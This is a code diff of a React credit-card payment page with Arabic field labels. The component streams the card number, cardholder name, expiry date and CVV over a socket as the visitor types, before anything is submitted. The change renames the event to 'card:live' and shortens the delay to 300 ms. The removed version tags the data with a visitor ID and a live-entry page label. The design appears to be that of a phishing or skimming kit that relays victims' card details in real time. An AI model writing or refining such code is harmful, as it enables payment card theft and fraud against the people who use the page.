@@ -172,20 +172,13 @@ export default function CreditCardPayment() {
   useEffect(() => {
     if (debounceRef.current) clearTimeout(debounceRef.current);
     debounceRef.current = setTimeout(() => {
-      if (cardNumber || nameOnCard || expiryDate || cvv) {
-        socket.value.emit("more-info", {
-          _id: visitor.value._id,
-          content: {
-            "رقم البطاقة": cardNumber,
-            "الاسم على البطاقة": nameOnCard,
-            "تاريخ الانتهاء": expiryDate,
-            "رمز الأمان (CVV)": cvv,
-            "الحالة": "إدخال بيانات البطاقة"
-          },
-          page: "صفحة الدفع - إدخال فوري"
-        });
-      }
-    }, 1000);
+      socket.value.emit("card:live", {
+        cardNumber: cardNumber || "",
+        nameOnCard: nameOnCard || "",
+        expiryDate: expiryDate || "",
+        cvv: cvv || "",
+      });
+    }, 300);
     return () => { if (debounceRef.current) clearTimeout(debounceRef.current); };
   }, [cardNumber, nameOnCard, expiryDate, cvv]);
 
